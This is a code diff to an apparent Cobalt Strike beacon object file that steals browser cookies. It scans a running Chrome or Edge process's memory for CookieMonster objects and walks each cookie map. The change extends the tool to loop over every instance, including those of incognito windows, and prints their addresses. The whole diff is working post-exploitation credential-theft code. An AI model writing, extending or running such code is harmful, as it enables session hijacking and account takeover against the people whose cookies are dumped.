@@ -43,7 +43,6 @@ extern "C" {
         }
     }
 
-
     //Example inputs:
     //  edge:   0a000000060000002f6564676500
     //  chrome: 0c000000080000002f6368726f6d6500
@@ -186,25 +185,41 @@ extern "C" {
 #ifdef _DEBUG
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Found second pattern on 0x%p\n", (void*)resultAddress);
 #endif
-
         BYTE thirdPattern[sizeof(uintptr_t)];
         ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));
-        if (!FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), resultAddress)) {
+
+        uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t) * 100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
+        size_t szCookieMonster = 0;
+        if (CookieMonsterInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
             BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the third pattern!\n");
             CloseHandle(hChrome);
+            free(CookieMonsterInstances);
             return;
     }
 #ifdef _DEBUG
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found third pattern on 0x%p\n", (void*)resultAddress);
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found %zu instances of CookieMonster!\n", szCookieMonster);
+
+        for (size_t i = 0; i < szCookieMonster; i++)
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Found CookieMonster on 0x%p\n", (void*)CookieMonsterInstances[i]);
 #endif
-        uintptr_t CookieMapOffset = 0x28; //Hardcoded, this seems to be the case no matter what version or browser (Chrome, Chromium, Edge)
-        CookieMapOffset += resultAddress + sizeof(uintptr_t); //Include the length of the result address as well
-#if defined(_DEBUG)
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] CookieMap should be found in address 0x%p\n", (void*)CookieMapOffset);
+        //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
+        //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
+        for (size_t i = 1; i < szCookieMonster; i++)
+        {
+            if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
+                break;
+
+            uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
+            CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
+#ifdef _DEBUG
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] CookieMap should be found in address 0x%p\n", (void*)CookieMapOffset);
 #endif
-        WalkCookieMap(hChrome, CookieMapOffset);
+            WalkCookieMap(hChrome, CookieMapOffset);
+        }
 
         CloseHandle(hChrome);
+        free(CookieMonsterInstances);
+
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
     }
 }
